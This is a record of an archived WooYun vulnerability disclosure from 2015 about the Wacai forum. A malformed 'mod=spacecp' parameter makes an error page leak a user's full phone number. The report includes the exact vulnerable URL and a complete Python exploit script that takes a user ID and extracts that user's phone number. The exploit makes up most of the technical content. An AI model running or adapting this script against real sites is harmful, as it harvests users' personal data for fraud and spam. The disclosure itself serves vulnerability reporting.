{"id": 26014, "wybug_id": "wooyun-2015-0121540", "wybug_title": "挖财论坛某页面过滤不完整可任意读取部分用户手机号附Exp", "wybug_corp": "杭州财米科技有限公司", "wybug_author": "SheepGuest", "wybug_date": "2015-06-19 08:30", "wybug_open_date": "2015-06-24 08:32", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问", "用户敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 漏洞说小也小,说大也大,只要不被黑产牛利用一切都是好的,不然满屏诈骗信息... 详细说明：  废话不多说，直接上图\n\n问题出在这个URL上面\nhttp://bbs.wacai.com/home.php?mod=spacecp'&ac=poke&op=send&uid=3864222&handlekey=propokehk_3864222&infloat=yes&handlekey=a_poke_3864222&inajax=1&ajaxtarget=fwin_content_a_poke_3864222\nmod=spacecp 后面随便加个符号 比如我这里加的单引号,会以内部错误的原因将页面返还,并且手机号也完整的显示出来了...\n\n   漏洞证明：  Exp：\n# -*- coding: utf-8 -*-__author__ = 'SheepGuest'import reimport urllibimport urllib2#from sys import argvclass Wacai:      def __init__(self,uid):          self.url_headers = {              'User_Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',              'Proxy-Connection':'keep-alive',              'Cache-Control':'max-age=0',              'Accept':'*/*',              'x-requested-with':'XMLHttpRequest',              'Accept-Language':'zh-cn',              'Referer':'http://bbs.wacai.com/home.php?mod=space&uid=' + str(uid) + '&do=profile.&from=space',                                                    }          self.url = 'http://bbs.wacai.com/home.php'          self.req = re.compile('<title>(\\d{11}).*?</title>')      def gethtml(self,uid):          try:             post_values = urllib.urlencode({                           'mod':'spacecp.','ac':'poke','op':'send','uid':str(uid),'handlekey':'propokehk_' + str(uid),                           'infloat':'yes','handlekey':'a_poke_' + str(uid),'inajax':'1','ajaxtarget':'fwin_content_a_poke_' + str(uid),                                                                                   })             postdata = self.url + '?' + post_values             request = urllib2.Request(postdata,data=None,headers=self.url_headers)             response = urllib2.urlopen(request)             return response.read().decode('utf-8')          except urllib2.URLError, e:              if hasattr(e,\"reason\"):                  print u\"连接挖财网失败,错误原因\",e.reason                  return None      def getTel(self,response):          try:             result = re.search(self.req,response)             result = result.group(1)             print 'Tel is : %s' % result          except AttributeError, e:              print u\"请输入正确的uid\"              return Noneif __name__ == '__main__':    #script,uid = argv    uid = raw_input('input uid:')    if len(uid) > 7:        print u\"uid范围在 1 ~ 7 位\"    else:         ptel = Wacai(uid)         response = ptel.gethtml(uid)         ptel.getTel(response)\n上图测试下效果\n\n\n\n\n\n\n\n   修复方案：  过滤完整   版权声明：转载请注明来源 SheepGuest@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-24 08:32 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 2015-06-24：感谢您的反馈，漏洞已紧急处理  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}